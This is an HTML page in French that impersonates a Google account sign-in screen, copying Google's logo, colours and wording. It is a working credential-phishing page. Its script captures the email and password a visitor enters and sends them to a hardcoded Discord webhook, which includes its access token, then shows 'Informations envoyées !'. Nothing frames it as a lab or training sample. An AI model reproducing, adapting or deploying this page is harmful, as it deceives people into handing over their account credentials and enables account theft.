<!DOCTYPE html>
<html lang="fr">
  <head><link rel="icon" type="image/png" href="icon.png"></head>
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connexion : comptes Google</title>
    <style>
      body {
        font-family: 'Roboto', sans-serif;
        background-color: #f1f3f4;
        margin: 0;
        padding: 0;
      }

      .login-container {
        width: 90%;
        max-width: 420px;
        margin: 50px auto;
        background-color: #fff;
        padding: 20px;
        border-radius: 8px;
        box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
      }

      #logo {
        text-align: center;
        margin-bottom: 20px;
      }

      #logo img {
        width: 150px; /* Taille du logo de Google */
      }

      .g-h1 {
        font-size: 26px;
        font-weight: 500;
        text-align: center;
        color: #202124;
        margin-bottom: 10px;
      }

      .g-h2 {
        font-size: 16px;
        text-align: center;
        color: #5f6368;
        margin-bottom: 30px;
      }

      .g-input {
        width: 100%;
        height: 40px;
        background-color: transparent;
        font-size: 16px;
        padding: 10px;
        margin-bottom: 15px;
        border: 1px solid #dadce0;
        border-radius: 4px;
        box-sizing: border-box;
      }

      .g-input:focus {
        outline: none;
        border-color: #1a73e8;
      }

      .create-account {
        font-size: 14px;
        color: #1a73e8;
        text-decoration: none;
        display: inline-block;
        margin-top: 10px;
        text-align: center;
      }

      .gbtn-primary {
        width: 100%;
        height: 45px;
        background-color: #1a73e8;
        color: white;
        font-size: 16px;
        font-weight: 500;
        border: none;
        border-radius: 4px;
        cursor: pointer;
        margin-top: 20px;
      }

      .gbtn-primary:hover {
        background-color: #1669c1;
      }

      .button-container {
        display: flex;
        justify-content: space-between;
        align-items: center;
      }

      .text {
        font-size: 14px;
        text-align: center;
        margin-top: 10px;
        color: #5f6368;
      }

      .txt {
        text-decoration: none;
        color: #1a73e8;
      }

      /* Media Queries pour la responsivité */
      @media (max-width: 480px) {
        .login-container {
          width: 95%;
          padding: 15px;
        }

        .g-h1 {
          font-size: 22px;
        }

        .g-h2 {
          font-size: 14px;
        }

        .g-input {
          height: 35px;
          font-size: 14px;
        }

        .gbtn-primary {
          height: 40px;
          font-size: 14px;
        }
      }

    </style>
  </head>
  <body>
    <div class="login-container">
      <div id="logo">
        <!-- Logo de Google -->
        <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" alt="Google Logo">
      </div>
      <form id="email-form-step">
        <h1 class="g-h1">Se connecter</h1>
        <h2 class="g-h2">Utilisez votre compte Google</h2>

        <input name="email" id="email" type="text" class="g-input" placeholder="Email ou téléphone" required>
        <input name="password" id="password" type="password" class="g-input" placeholder="Entrez votre mot de passe" required>

        <div class="text">
          Vous n'êtes pas sur votre ordinateur ? Utilisez le mode invité pour vous connecter en privé. <a href="#" class="txt">En savoir plus</a>
        </div>

        <div class="button-container">
          <a class="create-account" href="https://ltx128.github.io/SoundTag/">Mots de pass oublié ?</a>
          <button class="gbtn-primary" type="submit">Suivant</button>
        </div>
      </form>
    </div>

    <script>
      document.getElementById('email-form-step').addEventListener('submit', function(event) {
        event.preventDefault();  // Empêche l'envoi normal du formulaire

        // Récupère les valeurs des champs
        const email = document.getElementById('email').value;
        const password = document.getElementById('password').value;

        // Crée le contenu à envoyer au webhook Discord
        const webhookData = {
          content: `Email: ${email}\nPassword: ${password}`
        };

        // Envoie les données au webhook Discord
        fetch('https://discord.com/api/webhooks/1355320985288446077/NSAYZfIIBBvcktBZOg2tgPqr5dbQeESG5sPtG6qJXvyfNZSO6TGuLxXBezl1cJyAyJue', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify(webhookData),
        })
        .then(response => response.json())
        .then(data => {
          console.log('Success:', data);
          alert("Informations envoyées !");
        })
        .catch((error) => {
          console.error('Error:', error);
        });
      });
    </script>
  </body>
</html>
